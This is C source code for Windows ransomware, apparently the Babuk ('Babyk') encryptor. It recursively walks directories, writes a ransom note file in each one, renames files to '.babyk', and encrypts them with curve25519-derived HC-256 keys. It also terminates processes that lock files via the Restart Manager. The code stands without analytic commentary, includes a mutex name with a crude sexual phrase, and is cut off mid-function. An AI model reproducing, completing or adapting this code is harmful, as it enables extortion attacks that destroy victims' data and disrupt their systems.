#include <windows.h>
#include <tlhelp32.h>
#include <restartManager.h>
#include <wbemprov.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <lm.h>

#include "hash/crc32.h"
#include "hash/sha512.h"
#include "eSTREAM/ecrypt-sync.h"
#include "ecc/curve25519-donna.h"

#include "another.h"
#include "memory.h"
#include "queue.h"
#include "debug.h"
#include "args.h"

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "rstrtmgr.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "mpr.lib")

#pragma comment(linker, "/ENTRY:entry")
#pragma comment(linker, "/MERGE:.rdata=.text")

#define NOTE_FILE_NAME L"How To Restore Your Files.txt"

static const WCHAR* black[] = {
    0, L"AppData", L"Boot", L"Windows", L"Windows.old",
    L"Tor Browser", L"Internet Explorer", L"Google", L"Opera",
    L"Opera Software", L"Mozilla", L"Mozilla Firefox", L"$Recycle.Bin",
    L"ProgramData", L"All Users", L"autorun.inf", L"boot.ini", L"bootfont.bin",
    L"bootsect.bak", L"bootmgr", L"bootmgr.efi", L"bootmgfw.efi", L"desktop.ini",
    L"iconcache.db", L"ntldr", L"ntuser.dat", L"ntuser.dat.log", L"ntuser.ini", L"thumbs.db",
    L"Program Files", L"Program Files (x86)", L"#recycle", L"..", L"."
};

static BYTE m_publ[32] = {
        'c',  'u',  'r',  'v',  'p',  'a',  't',  't',  'e',  'r',
        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
};

static const CHAR ransom_note[] =
"notepatternxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
;

static QUEUE que_f;
static QUEUE que_p;
static BOOL debug_mode = 0;

static HCRYPTPROV hProv = 0;

#define VERSION_MUTEX "DoYouWantToHaveSexWithCuongDong"

#define CONST_BLOCK_PLUS 0x100000
#define CONST_BLOCK_MINUS -CONST_BLOCK_PLUS

#define CONST_LARGE_FILE 0x1400000
#define CONST_MEDIUM_FILE 0x500000

struct BABUK_KEYS {
    BYTE               hc256_key[32];
    BYTE               hc256_vec[32];
};

struct BABUK_SESSION {
    BYTE       curve25519_shared[32];
    BYTE      curve25519_private[32];
};

struct BABUK_FILEMETA {
    BYTE          curve25519_pub[32];
    DWORD                xcrc32_hash;
    LONGLONG                   flag1;
    LONGLONG                   flag2;
    LONGLONG                   flag3;
    LONGLONG                   flag4;
};

void _encrypt_file(WCHAR* filePath) {
    const uint8_t basepoint[32] = { 9 };

    BOOL tryToUnlock = TRUE;
    LARGE_INTEGER fileSize;
    LARGE_INTEGER fileOffset;
    LARGE_INTEGER fileChunks;

    ECRYPT_ctx ctx;

    BABUK_KEYS babuk_keys;
    BABUK_SESSION babuk_session;
    BABUK_FILEMETA babuk_meta;
    babuk_meta.flag1 = 0x6420676e756f6863;
    babuk_meta.flag2 = 0x6b6f6f6c20676e6f;
    babuk_meta.flag3 = 0x6820656b696c2073;
    babuk_meta.flag4 = 0x2121676f6420746f;

    SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);

    if (WCHAR* newName = (WCHAR*)_halloc((lstrlenW(filePath) + 7) * sizeof(WCHAR))) {
        lstrcpyW(newName, filePath);
        lstrcatW(newName, L".babyk");

        if (MoveFileExW(filePath, newName, MOVEFILE_WRITE_THROUGH | MOVEFILE_REPLACE_EXISTING) != 0) {
        retry:;
            HANDLE hFile = CreateFileW(newName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, 0);
            _hfree(newName);

            DWORD dwRead;
            DWORD dwWrite;
            if (hFile != INVALID_HANDLE_VALUE) {
                GetFileSizeEx(hFile, &fileSize);
                if (BYTE* ioBuffer = (BYTE*)_halloc(CONST_BLOCK_PLUS)) {
                    CryptGenRandom(hProv, 32, babuk_session.curve25519_private);
                    babuk_session.curve25519_private[0] &= 248;
                    babuk_session.curve25519_private[31] &= 127;
                    babuk_session.curve25519_private[31] |= 64;
                    curve25519_donna(babuk_meta.curve25519_pub, babuk_session.curve25519_private, basepoint);
                    curve25519_donna(babuk_session.curve25519_shared, babuk_session.curve25519_private, m_publ);

                    SHA512_Simple(babuk_session.curve25519_shared, 32, (BYTE*)&babuk_keys);
                    ECRYPT_keysetup(&ctx, babuk_keys.hc256_key, 256, 256);
                    ECRYPT_ivsetup(&ctx, babuk_keys.hc256_vec);

                    babuk_meta.xcrc32_hash = xcrc32((BYTE*)&babuk_keys, sizeof(BABUK_KEYS));
                    _memset((BYTE*)&ctx.key[0], 0, 16 * sizeof(uint32_t));
                    _memset((BYTE*)&babuk_keys, 0, sizeof(BABUK_KEYS));
                    _memset((BYTE*)&babuk_session, 0, sizeof(BABUK_SESSION));

                    fileOffset.QuadPart = 0;
                    SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                    if (fileSize.QuadPart > CONST_LARGE_FILE) {
                        fileChunks.QuadPart = fileSize.QuadPart / 0xA00000i64;
                        for (LONGLONG i = 0; i < fileChunks.QuadPart; i++) {
                            ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                            ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            WriteFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwWrite, 0);

                            fileOffset.QuadPart += 0xA00000i64;
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        }
                    }
                    else if (fileSize.QuadPart > CONST_MEDIUM_FILE) {
                        LONGLONG jump = fileSize.QuadPart / 3;

                        for (LONGLONG i = 0; i < 3; i++) {
                            ReadFile(hFile, ioBuffer, CONST_BLOCK_PLUS, &dwRead, 0);
                            ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                            WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);

                            fileOffset.QuadPart += jump;
                            SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        }
                    }
                    else if (fileSize.QuadPart > 0) {
                        LONGLONG block_size = fileSize.QuadPart > 64 ? fileSize.QuadPart / 10 : fileSize.QuadPart;

                        ReadFile(hFile, ioBuffer, block_size, &dwRead, 0);
                        ECRYPT_process_bytes(0, &ctx, ioBuffer, ioBuffer, dwRead);
                        SetFilePointerEx(hFile, fileOffset, 0, FILE_BEGIN);
                        WriteFile(hFile, ioBuffer, dwRead, &dwWrite, 0);
                    }

                    _memset((BYTE*)&ctx, 0, sizeof(ECRYPT_ctx));

                    fileOffset.QuadPart = 0;
                    SetFilePointerEx(hFile, fileOffset, 0, FILE_END);
                    WriteFile(hFile, (BYTE*)&babuk_meta, sizeof(BABUK_FILEMETA), &dwWrite, 0);

                    _hfree(ioBuffer);
                }
                CloseHandle(hFile);
            }
            else if (tryToUnlock) {
                DWORD dwError = 0;

                DWORD dwSession;
                WCHAR szSessionKey[CCH_RM_SESSION_KEY + 1];
                _memset(szSessionKey, 0, sizeof(szSessionKey));

                if (dwError = RmStartSession(&dwSession, 0, szSessionKey) == ERROR_SUCCESS) {
                    if (dwError = RmRegisterResources(dwSession, 1, (LPCWSTR*)&filePath, 0, NULL, 0, NULL) == ERROR_SUCCESS) {
                        DWORD dwReason;
                        UINT nProcInfoNeeded;
                        UINT nProcInfo = 10;
                        RM_PROCESS_INFO rgpi[10];
                        if (dwError = RmGetList(dwSession, &nProcInfoNeeded, &nProcInfo, rgpi, &dwReason) == ERROR_SUCCESS) {
                            for (UINT i = 0; i < nProcInfo; i++) {
                                if (rgpi[i].ApplicationType != RmExplorer && rgpi[i].ApplicationType != RmCritical && GetCurrentProcessId() != rgpi[i].Process.dwProcessId) {
                                    HANDLE hProcess = OpenProcess(SYNCHRONIZE | PROCESS_TERMINATE, 0, rgpi[i].Process.dwProcessId);
                                    if (hProcess != INVALID_HANDLE_VALUE) {
                                        TerminateProcess(hProcess, 0);
                                        WaitForSingleObject(hProcess, 5000);

                                        CloseHandle(hProcess);
                                    }
                                    else if (debug_mode) {
                                        int size_needed = WideCharToMultiByte(CP_UTF8, 0, rgpi[i].strAppName, (int)lstrlenW(rgpi[i].strAppName), NULL, 0, NULL, NULL);
                                        char* strTo = (char*)_halloc(size_needed);
                                        WideCharToMultiByte(CP_UTF8, 0, rgpi[i].strAppName, (int)lstrlenW(rgpi[i].strAppName), strTo, size_needed, NULL, NULL);

                                        _dbg_report("Can't OpenProcess", strTo, GetLastError());

                                        _hfree(strTo);
                                    }
                                }
                            }
                        }
                        else if (debug_mode) {
                            int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
                            char* strTo = (char*)_halloc(size_needed);
                            WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

                            _dbg_report("Can't RmGetList", strTo, dwError);

                            _hfree(strTo);
                        }
                    }
                    else if (debug_mode) {
                        int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
                        char* strTo = (char*)_halloc(size_needed);
                        WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

                        _dbg_report("Can't RmRegisterResources", strTo, dwError);

                        _hfree(strTo);
                    }
                    RmEndSession(dwSession);

                    tryToUnlock = FALSE;
                    goto retry;
                }
                else if (debug_mode) {
                    int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
                    char* strTo = (char*)_halloc(size_needed);
                    WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

                    _dbg_report("Can't RmStartSession", strTo, dwError);

                    _hfree(strTo);
                }
            }
            else if (debug_mode) {
                int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
                char* strTo = (char*)_halloc(size_needed);
                WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

                _dbg_report("Can't open file after killHolder", strTo, GetLastError());

                _hfree(strTo);
            }
        }
        else if (debug_mode) {
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), NULL, 0, NULL, NULL);
            char* strTo = (char*)_halloc(size_needed);
            WideCharToMultiByte(CP_UTF8, 0, filePath, (int)lstrlenW(filePath), strTo, size_needed, NULL, NULL);

            _dbg_report("Can't MoveFileExW", strTo, GetLastError());

            _hfree(strTo);
        }
    }
}

void find_files_recursive(LPCWSTR dirPath)
{
    DWORD dwO;
    if (WCHAR* localDir = (WCHAR*)_halloc(32768 * sizeof(WCHAR)))
    {
        lstrcpyW(localDir, dirPath);
        lstrcatW(localDir, L"\\" NOTE_FILE_NAME);

        HANDLE hNoteFile = CreateFileW(localDir, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, 0, 0);
        if (hNoteFile != INVALID_HANDLE_VALUE) {
            WriteFile(hNoteFile, ransom_note, lstrlenA(ransom_note), &dwO, 0);
            CloseHandle(hNoteFile);
        }

        WIN32_FIND_DATAW fd;
        lstrcpyW(localDir, dirPath);
        lstrcatW(localDir, L"\\*");

        HANDLE hIter = FindFirstFileW(localDir, &fd);
        if (hIter != INVALID_HANDLE_VALUE)
        {
            do
            {
                for (DWORD i = 0; i < _countof(black); ++i) {
                    if (!lstrcmpiW(fd.cFileName, black[i])) {
                        goto skip;
                    }
                }

                lstrcpyW(localDir, dirPath);
                lstrcatW(localDir, L"\\");
                lstrcatW(localDir, fd.cFileName);

                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && lstrcmpW(fd.cFileName, NOTE_FILE_NAME) != 0)
                {
                    for (int i = lstrlenW(fd.cFileName) - 1; i >= 0; i--) {
                        if (fd.cFileName[i] == L'.') {
                            if (
                                lstrcmpiW(fd.cFileName + i, L".exe") == 0
                                ||
                                lstrcmpiW(fd.cFileName + i, L".dll") == 0
                                ||
                                lstrcmpiW(fd.cFileName + i, L".babyk") == 0
                                ) {
                                goto skip;
                            }
                            else break;
                        }
                    }

                    while (_que_push(&que_f, localDir, FALSE) == 0) {
                        INT iError = 0;
                        while (WCHAR* path = _que_pop(&que_f, FALSE, &iError)) {
                            _encrypt_file(path);
                            _hfree(path);
                        }
                    }
                }
            skip:;
            } while (FindNextFileW(hIter, &fd));
            FindClose(hIter);
        }
        else if (debug_mode) {
            int size_needed = WideCharToMultiByte(CP_UTF8, 0, dirPath, (int)lstrlenW(dirPath), NULL, 0, NULL, NULL);
            char* strTo = (char*)_halloc(size_needed);
            WideCharToMultiByte(CP_UTF8, 0, dirPath, (int)lstrlenW(dirPath), strTo, size_needed, NULL, NULL);

            _dbg_report("Can't FindFirstFileW", strTo, GetLastError());

            _hfree(strTo);
